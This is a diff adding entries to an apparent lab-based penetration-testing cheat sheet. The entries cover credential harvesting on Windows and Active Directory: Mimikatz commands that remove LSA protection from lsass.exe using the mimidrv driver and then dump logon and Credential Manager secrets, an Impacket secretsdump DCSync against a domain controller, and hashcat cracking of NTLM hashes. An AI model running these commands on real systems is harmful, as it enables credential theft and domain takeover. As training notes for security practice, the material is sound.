@@ -122,3 +122,56 @@ Simple SCP from Windows Victim Machine to ATTAK Machine Kali:
     scp FileNAme <Username>@<KALI IP>:/FilePAth/ .
 
 
+####################
+MIMIKATZ - LSASS DUMP MEMORY (Check: Check: AD -> Credentials Harversting -> Local Security Authority Subsystem Service LSASS.txt)
+####################
+
+Runing mimikatz With Admin Privielges
+    C:\Tools\Mimikatz> mimikatz.exe
+
+Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. 
+It can be done by executing:
+    privilege::debug command as follows:
+
+    mimikatz # privilege::debug
+        Privilege '20' OK
+
+Failing to Dump Stored Password Due to the LSA Protection
+        mimikatz # sekurlsa::logonpasswords
+            ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+The command returns a 0x00000005 error code message (Access Denied). 
+Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,
+
+Loading the mimidrv Driver into Memory
+    mimikatz # !+
+
+Removing the LSA Protection:
+    mimikatz # !processprotect /process:lsass.exe /remove
+
+
+
+####################
+Mimikatz:Dumping Memory for Credentials Manager (Check: AD -> Credentials Harversting -> Windows Credential Manager.txt)
+####################
+
+C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe
+    mimikatz # privilege::debug
+    Privilege '20' OK
+
+    mimikatz # sekurlsa::credman
+
+
+####################
+DC Sync:Impacket DE-HASH (Check: AD -> Credentials Harversting -> Dumping Domain Controller.txt)
+####################
+
+The DC Sync Attack to Dump NTLM Hashes in KALI:
+        user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@MACHINE_IP
+        
+        Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such hashcat. 
+            
+            
+        We can use the hashcat -m 1000 mode to crack the Windows NTLM hashes as follows:
+        Cracking the Hashes in KALI:
+            user@machine$ hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
